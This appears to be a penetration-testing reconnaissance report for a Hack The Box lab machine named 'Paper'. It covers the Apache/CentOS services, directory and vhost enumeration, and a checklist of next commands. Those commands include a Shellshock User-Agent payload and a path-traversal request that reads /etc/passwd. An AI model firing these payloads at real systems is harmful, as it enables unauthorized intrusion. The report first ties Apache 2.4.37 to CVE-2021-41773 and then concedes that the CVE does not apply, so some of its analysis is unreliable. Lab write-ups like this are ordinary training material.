# Paper — Reconnaissance Report

## Target
| Field | Value |
|-------|-------|
| IP (VPN) | 10.129.136.31 |
| OS | Linux (CentOS) |
| Difficulty | Easy |
| Last Updated | 2026-03-21 |

---

## Services Table

| Port | Service | Version | Key Findings |
|------|---------|---------|--------------|
| 22/tcp | ssh | OpenSSH 8.0 (protocol 2.0) | RSA/ECDSA/ED25519 host keys captured. No anonymous access. Low-priority brute-force target only. |
| 80/tcp | http | Apache 2.4.37 (CentOS) | mod_fcgid/2.3.9; HTML Tidy 5.7.28; TRACE method enabled; serves default CentOS test page |
| 443/tcp | ssl/http | Apache 2.4.37 (CentOS) | Same stack as port 80; **expired self-signed cert** (CN=localhost.localdomain; expired 2022-07-08) |

---

## Detailed Findings

### Apache 2.4.37 — Critical Context

Apache 2.4.37 is vulnerable to **CVE-2021-41773** (path traversal + RCE chain with mod_cgi). This version falls squarely in the vulnerable range. The presence of `mod_fcgid` strongly suggests CGI execution is possible — this is a key attack vector to probe.

### mod_fcgid / 2.3.9

FastCGI module is present. This enables Apache to execute CGI scripts (Python, Perl, Bash, etc.) via `mod_fcgid`. Combined with the CVE-2021-41773 path traversal, this creates a potential RCE chain.

### TRACE Method Enabled

HTTP TRACE is enabled on both ports. While largely mitigated in modern browsers (with `HttpOnly` cookies), it can be used for:
- Cookie theft in older/specific client configurations
- Confirming proxy and load balancer hops
- Information disclosure about internal headers

Low priority but worth noting.

### /cgi-bin/ — 403 Forbidden

```
cgi-bin/  (Status: 403) [Size: 199]
```

The 403 response is **significant**. It tells us:
1. The path **exists** on the filesystem (Apache must find it to return 403)
2. Access is being **denied** — likely by a `<Directory>` block or `.htaccess` rule
3. It is **not** a 404, so path traversal + `%2e%2e` encoding tricks may still reach it
4. If we can bypass the 403 via path traversal (`/cgi-bin/.%2e/`), the CGI scripts inside become RCE targets

### Expired SSL Certificate (localhost.localdomain)

```
Subject: CN=localhost.localdomain / organizationName=Unspecified / countryName=US
Not valid after: 2022-07-08
```

- **Not useful for impersonation** — self-signed, expired, no public trust
- **Indicates a default/unconfigured CentOS Apache install** — the box creator may have left things minimal
- **CN localhost.localdomain** — matches the Apache default vhost; likely the default SSL site, not a real service
- The **real application** is probably on a different vhost (e.g., `paper.htb`)

### Default CentOS Test Page

Both HTTP and HTTPS return the Apache default test page. The real application is hidden behind vhost routing. Standard directory enumeration on the IP alone will not reveal it.

### /manual (301 → Apache Documentation)

```
manual  (Status: 301) [--> http://10.129.136.31/manual/]
```

Apache documentation is exposed. This leaks:
- Exact Apache version details
- Configuration file structure
- Built-in module documentation
- Potential links to example CGI scripts

Useful for confirming version-specific exploits and configuration patterns.

---

## Vhost Enumeration Status

| Target | Port | Wordlist | Result |
|--------|------|----------|--------|
| paper.htb | 8080 | subdomains-top1million-5000 | No results found |
| localhost.localdomain | 8080 | subdomains-top1million-5000 | No results found |
| (generic) | 8080 | subdomains-top1million-5000 | No results found |

**Issues with current vhost scans:**
- Scans were run on **ports 8080/8081**, but nmap shows services on **ports 80/443**. Vhosts need to be tested on the correct ports.
- The 10-second timeout may be too short for HTB VPN latency.
- Wordlist may not include the correct domain — `paper.htb` (or variations) should be the primary target.

---

## Directory Enumeration Summary

| Path | Status | Interpretation |
|------|--------|----------------|
| /.htaccess | 403 | File exists, access denied (normal) |
| /.htpasswd | 403 | File exists, access denied (normal) |
| /.hta | 403 | File exists, access denied (normal) |
| /cgi-bin/ | 403 | Path exists, access denied — **potential bypass target** |
| /manual | 301 → /manual/ | Apache docs exposed — information disclosure |

HTTP and HTTPS (ports 80/443) return identical results.

---

## Vulnerability Analysis

### 1. CVE-2021-41773 — Apache Path Traversal + RCE (PRIORITY: HIGH)

- **Affected versions**: Apache 2.4.49 and 2.4.50 (2.4.37 is *before* these, but may have related vulnerabilities)
- **Wait** — Apache 2.4.37 is *before* 2.4.49, so this specific CVE does not apply directly. However, other mod_cgi vulnerabilities may exist.
- **mod_fcgid present** means CGI execution is configured. Check for:
  - Shellshock (CVE-2014-6271) if bash scripts are in cgi-bin
  - Default CGI scripts (`test.cgi`, `printenv`, `printenv.pl`)
  - Any custom CGI applications

### 2. CGI Exploitation Path (PRIORITY: HIGH)

If we can reach `/cgi-bin/` or a CGI script:
- **Shellshock test**: `curl -H "User-Agent: () { :; }; echo; id" http://target/cgi-bin/script.cgi`
- **Path traversal to reach cgi-bin**: `/cgi-bin/.%2e/` or `/cgi-bin/..%2f..%2f`
- **mod_fcgid specific exploits**: Check ExploitDB for mod_fcgid vulnerabilities

### 3. TRACE Method (PRIORITY: LOW)

Enabled but low practical impact in modern environments.

---

## Next Steps Checklist

### Immediate Actions

- [ ] **Test CVE-2021-41773 path traversal on 10.129.136.31:80**
  ```bash
  curl -v --path-as-is http://10.129.136.31/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
  ```

- [ ] **Shellshock test against /cgi-bin/**
  ```bash
  curl -H "User-Agent: () { :; }; echo; id" http://10.129.136.31/cgi-bin/anything
  ```

- [ ] **Check for default CGI scripts**
  ```bash
  curl -s http://10.129.136.31/cgi-bin/test.cgi
  curl -s http://10.129.136.31/cgi-bin/printenv
  curl -s http://10.129.136.31/cgi-bin/printenv.pl
  ```

- [ ] **Re-run vhost enumeration on port 80 (not 8080)**
  ```bash
  # Add paper.htb to /etc/hosts first
  echo "10.129.136.31 paper.htb" | sudo tee -a /etc/hosts
  
  # Then scan with Host: header
  ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    -H "Host: FUZZ.paper.htb" -u http://paper.htb -fs 0 -v
  
  # Also try fuzzing the Host header directly on the IP
  gobuster vhost -u http://10.129.136.31 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
  ```

- [ ] **Browse /manual/ for version-specific info and example scripts**

### Additional Enumeration

- [ ] **Check for `robots.txt`, `sitemap.xml`, `.git/`, `.env`, `config.php`**
  ```bash
  curl -s http://10.129.136.31/robots.txt
  curl -s http://10.129.136.31/.git/config
  ```

- [ ] **Run nmap HTTP scripts for deeper probing**
  ```bash
  nmap -p80,443 --script=http-enum,http-robots.txt,http-title,http-headers,http-methods,ssl-poodle,http-shellshock \
    -Pn 10.129.136.31
  ```

- [ ] **Try common subdirectory targets (admin, backup, old, dev, static)**
  ```bash
  curl -s http://10.129.136.31/admin/
  curl -s http://10.129.136.31/backup/
  curl -s http://10.129.136.31/old/
  ```

- [ ] **Test HTTP headers for additional info**
  ```bash
  curl -sv http://10.129.136.31/ 2>&1 | grep -i "server\|x-"
  ```

- [ ] **Try the HTTPS port directly with curl (ignore cert errors)**
  ```bash
  curl -sk https://10.129.136.31/ -H "Host: paper.htb"
  curl -sk https://10.129.136.31/cgi-bin/ -H "Host: paper.htb"
  ```

---

## Recommendations Summary

### Priority 1: Vhost Discovery
The default page confirms the real app is behind vhost routing. The expired `localhost.localdomain` cert and `paper.htb` domain both suggest the target vhost name. Re-scan vhosts on **port 80** (not 8080), add `paper.htb` to `/etc/hosts`, and try fuzzing with `ffuf` or `wfuzz` for more comprehensive results than gobuster's vhost mode.

### Priority 2: CGI Exploitation
`mod_fcgid` + `/cgi-bin/` (403) is a strong hint. Even if the directory is blocked by configuration, CVE-2021-41773-style path traversal may bypass it. Test Shellshock payloads against any discovered CGI script. If `/cgi-bin/printenv` or `/cgi-bin/test.cgi` exist, they confirm CGI is live.

### Priority 3: Apache Version Research
Apache 2.4.37 is from 2018. Check ExploitDB and searchsploit for "apache 2.4.37" and "mod_fcgid 2.3.9" for known exploits. The `HTML Tidy for HTML5 version 5.7.28` generator tag is also a specific version to research.

### Priority 4: SSL Cert
The expired cert is a dead end for direct exploitation. Focus on using the `CN=localhost.localdomain` finding as confirmation this is a default CentOS Apache install — look for default paths like `/var/www/html/`, `/etc/httpd/`, and default credential patterns.

---

*Recon document maintained: 2026-03-21*
